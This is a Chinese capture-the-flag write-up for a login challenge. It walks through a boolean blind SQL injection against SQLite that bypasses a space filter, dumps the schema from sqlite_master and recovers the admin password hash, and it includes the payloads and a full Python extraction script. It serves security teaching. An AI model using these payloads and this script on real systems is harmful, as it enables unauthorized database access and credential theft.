# LoginMe

## 题目简述

登录接口把 `username` 拼入 SQLite 查询。题目提供 `test/test` 测试账号，并在 `/static/hint.webp` 中泄露查询语句的大致结构。管理员密码是实例重置时随机生成字符串的 MD5，因此不能依赖固定密码，必须通过布尔盲注逐字符恢复。

## 解题过程

服务日志和提示表明，`username` 位于带括号的条件中，使用下面的前缀可以闭合原查询：

```sql
test') AND (<condition>)--
```

过滤器会拦截普通空格，可以用 `/**/` 代替。SQLite 的表结构保存在 `sqlite_master` 中，先盲注其 `sql` 字段：

```sql
test')/**/and/**/substring(
  (select/**/sql/**/from/**/sqlite_master),
  1,
  1
)>'m'--
```

当比较条件成立时，查询仍能匹配测试账号；条件不成立时，接口返回“record not found”或 403。对每个位置的 ASCII 码做二分即可恢复表结构，并得到用户表名 `uuussseeerrrsss`。随后把子查询换成管理员密码：

```sql
test')/**/and/**/substring(
  (select/**/password/**/from/**/uuussseeerrrsss),
  1,
  1
)>'m'--
```

下面给出完整的二分提取框架。不同复现环境的成功响应文本可能不同，`oracle` 中应以“测试账号是否登录成功”为准调整判断条件。

```python
import requests

BASE_URL = "http://example.invalid"
session = requests.Session()

def oracle(condition):
    username = f"test')/**/and/**/({condition})--"
    response = session.post(
        f"{BASE_URL}/login",
        data={"username": username, "password": "test"},
        timeout=10,
        allow_redirects=False,
    )

    # 原题中假条件会返回 403 和 record not found。
    return response.status_code != 403 and "record not found" not in response.text

def extract(expression, max_length=256):
    result = []
    for position in range(1, max_length + 1):
        # 先判断该位置是否仍有字符。
        if not oracle(f"length({expression})>={position}"):
            break

        low, high = 31, 127
        while low + 1 < high:
            middle = (low + high) // 2
            condition = (
                f"unicode(substring({expression},{position},1))>{middle}"
            )
            if oracle(condition):
                low = middle
            else:
                high = middle

        result.append(chr(high))
        print("".join(result))
    return "".join(result)

schema = extract("(select/**/sql/**/from/**/sqlite_master/**/limit/**/1)")
print("schema:", schema)

password = extract(
    "(select/**/password/**/from/**/uuussseeerrrsss/**/limit/**/1)",
    max_length=32,
)
print("admin password:", password)
```

恢复 32 位 MD5 字符串后，以 `admin` 和该密码正常登录即可取得当前实例的 flag。官方材料没有保存动态 flag，因此不伪造一个固定值。

## 方法总结

本题的关键是利用已知有效账号建立稳定的布尔 oracle，再使用 SQLite 的 `sqlite_master` 自举出表结构。二分比较把每个字符的请求数从线性枚举降到约 $\log_2 96$ 次。由于管理员密码和 flag 都随实例重置，题解应保留可复现的提取流程，而不是记录某次运行的临时结果。
